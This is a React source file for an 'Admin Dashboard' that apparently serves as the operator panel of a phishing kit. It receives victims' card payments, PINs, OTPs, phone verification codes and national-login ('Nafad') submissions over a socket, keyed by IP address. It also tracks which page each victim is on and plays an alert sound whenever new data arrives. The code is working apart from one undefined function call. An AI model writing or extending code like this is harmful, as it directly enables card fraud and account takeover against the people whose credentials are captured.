// src/App.js
import React, { useEffect, useState, useRef } from "react";
import { Routes, Route, Navigate, useNavigate } from "react-router-dom";

import { socket } from "./socket";
import UserTable from "./components/UserTable";
import CardModal from "./components/CardModal";
import InfoModal from "./components/InfoModal";
import Login from "./Login";

export default function App() {
    const [users, setUsers] = useState({});
    const [cardIp, setCardIp] = useState(null);
    const [infoIp, setInfoIp] = useState(null);
    const [highlightIp, setHighlightIp] = useState(null);
    const newIpSound = useRef();
    const updateSound = useRef();
    const navigate = useNavigate();

    useEffect(() => {
        newIpSound.current = new Audio("/sounds/new-ip.wav");
        updateSound.current = new Audio("/sounds/new-data.wav");

        const enableSound = () => {
            setCanPlaySound(true);
            window.removeEventListener('click', enableSound);
            window.removeEventListener('keydown', enableSound);
        };
        window.addEventListener('click', enableSound);
        window.addEventListener('keydown', enableSound);

        (async () => {
            // 1) Look for a “random token” in localStorage
            const token = localStorage.getItem("token");
            if (!token) {
                navigate("/login", { replace: true });
                return;
            }

            // 2) Token is present → connect socket
            socket.connect();
            socket.emit("loadData");

            // ───── REPLACE: initialData handler now includes data.locations ─────
            socket.on("initialData", (data) => {
                const map = {};

                // 1) Flatten everything except “payment” and “flags” and “locations”
                Object.entries(data).forEach(([key, arr]) => {
                    if (key === "payment" || key === "flags" || key === "locations")
                        return;
                    arr.forEach((r) => {
                        console.log("info", r);

                        const ipKey = r.ip;
                        if (!map[ipKey]) {
                            map[ipKey] = { payments: [], flag: false, hasNewData: false };
                        }
                        map[ipKey] = {
                            ...map[ipKey],
                            ...r,
                            payments: map[ipKey].payments,
                            flag: map[ipKey].flag,
                            hasNewData: false,
                        };
                    });
                });

                // 2) Handle payments array separately
                if (data.payment) {
                    data.payment.forEach((payDoc) => {
                        const ipKey = payDoc.ip;
                        if (!map[ipKey]) {
                            map[ipKey] = { payments: [], flag: false, hasNewData: false };
                        }
                        map[ipKey].payments.push(payDoc);
                    });
                }

                // 3) Handle flags array separately
                if (data.flags) {
                    data.flags.forEach(({ ip: ipKey, flag }) => {
                        if (!map[ipKey]) {
                            map[ipKey] = { payments: [], flag: false, hasNewData: false };
                        }
                        map[ipKey].flag = flag;
                    });
                }

                // 4) NOW integrate “locations” so we know each user’s currentPage
                if (data.locations) {
                    data.locations.forEach(({ ip: ipKey, currentPage }) => {
                        if (!map[ipKey]) {
                            map[ipKey] = { payments: [], flag: false, hasNewData: false };
                        }
                        map[ipKey].currentPage = currentPage;
                    });
                }

                setUsers(map);
            });

            // Helper to merge single‐document updates
            const mergeSingleton = (u) => {
                setUsers((m) => {
                    const exists = !!m[u.ip];
                    if (!exists) newIpSound.current.play();
                    else updateSound.current.play();

                    const oldObj = m[u.ip] || {
                        payments: [],
                        flag: false,
                        hasNewData: false,
                    };
                    return {
                        ...m,
                        [u.ip]: {
                            ...oldObj,
                            ...u,
                            payments: oldObj.payments,
                            flag: oldObj.flag,
                            hasNewData: true, // new submission arrived!
                        },
                    };
                });
            };

            // When payments come in, append and mark hasNewData
            const appendPayment = (u) => {
                setUsers((m) => {
                    const exists = !!m[u.ip];
                    if (!exists) newIpSound.current.play();
                    else updateSound.current.play();

                    const oldObj = m[u.ip] || {
                        payments: [],
                        flag: false,
                        hasNewData: false,
                    };

                    return {
                        ...m,
                        [u.ip]: {
                            ...oldObj,
                            ...u,
                            payments: [...oldObj.payments, u],
                            flag: oldObj.flag,
                            hasNewData: true,
                        },
                    };
                });
            };

            const removeUser = ({ ip }) =>
                setUsers((m) => {
                    const copy = { ...m };
                    delete copy[ip];
                    return copy;
                });

            const updateFlag = ({ ip, flag }) =>
                setUsers((m) => ({
                    ...m,
                    [ip]: {
                        ...(m[ip] || { payments: [], flag: false, hasNewData: false }),
                        flag,
                    },
                }));

            socket.on("newIndex", (u) => mergeSingleton(u));
            socket.on("newDetails", (u) => mergeSingleton(u));
            socket.on("newShamel", (u) => mergeSingleton(u));
            socket.on("newThirdparty", (u) => mergeSingleton(u));
            socket.on("newBilling", (u) => mergeSingleton(u));
            socket.on("newPayment", (u) => appendPayment(u));
            socket.on("newPhone", (u) => mergeSingleton(u));
            socket.on("newPin", (u) => mergeSingleton(u));
            socket.on("newOtp", (u) => mergeSingleton(u));
            socket.on("newPhoneCode", (u) => mergeSingleton(u));
            socket.on("newNafad", (u) => mergeSingleton(u));

            // ───── REPLACE: locationUpdated now also handles “offline” ─────
            socket.on("locationUpdated", ({ ip, page }) => {
                if (page !== "offline") {
                    // A real page‐change → treat as “new data”
                    mergeSingleton({ ip, currentPage: page });
                } else {
                    // User went offline → immediately flip that row’s currentPage to "offline"
                    setUsers((m) => {
                        if (!m[ip]) return m;
                        return {
                            ...m,
                            [ip]: {
                                ...m[ip],
                                currentPage: "offline",
                                // do NOT change hasNewData/fingerprint here
                            },
                        };
                    });
                }
            });

            socket.on("userDeleted", removeUser);
            socket.on("flagUpdated", updateFlag);
        })();
    }, [navigate]);

    // When “Card” is clicked:
    //   1) Clear highlightIp so the green border stops flashing
    //   2) Mark that IP’s hasNewData = false (they’ve “seen” it)
    //   3) Open the modal
    const handleShowCard = (ip) => {
        setHighlightIp(null);
        setCardIp(ip);

        setUsers((m) => {
            if (!m[ip]) return m;
            return {
                ...m,
                [ip]: {
                    ...m[ip],
                    hasNewData: false, // mark as “read”
                },
            };
        });
    };

    return (
        <Routes>
            {/* Public login page, no token check here */}
            <Route path="/login" element={<Login />} />

            {/* Protected dashboard: only show if “token” exists */}
            <Route
                path="/"
                element={
                    localStorage.getItem("token") ? (
                        <DashboardView
                            users={users}
                            highlightIp={highlightIp}
                            cardIp={cardIp}
                            setCardIp={setCardIp}
                            infoIp={infoIp}
                            setInfoIp={setInfoIp}
                            onShowCard={handleShowCard}
                        />
                    ) : (
                        <Navigate to="/login" replace />
                    )
                }
            />

            {/* Catch‐all: redirect based on presence of token */}
            <Route
                path="*"
                element={
                    localStorage.getItem("token") ? (
                        <Navigate to="/" replace />
                    ) : (
                        <Navigate to="/login" replace />
                    )
                }
            />
        </Routes>
    );
}

//────────────────────────────────────────────────────────────────────────
// Dashboard UI (no logout button shown anywhere)
function DashboardView({
    users,
    highlightIp,
    cardIp,
    onShowCard,
    infoIp,
    setInfoIp,
    setCardIp,
}) {
    return (
        <div className="container py-4">
            <div className="d-flex justify-content-between align-items-center mb-3">
                <h2>Admin Dashboard</h2>
                {/* Logout button removed per request */}
            </div>

            <UserTable
                users={users}
                highlightIp={highlightIp}
                cardIp={cardIp}
                onShowCard={onShowCard}
                onShowInfo={setInfoIp}
            />

            {cardIp && (
                <CardModal
                    ip={cardIp}
                    user={users[cardIp]}
                    onClose={() => setCardIp(null)}
                />
            )}

            {infoIp && (
                <InfoModal
                    ip={infoIp}
                    user={users[infoIp]}
                    onClose={() => setInfoIp(null)}
                />
            )}
        </div>
    );
}
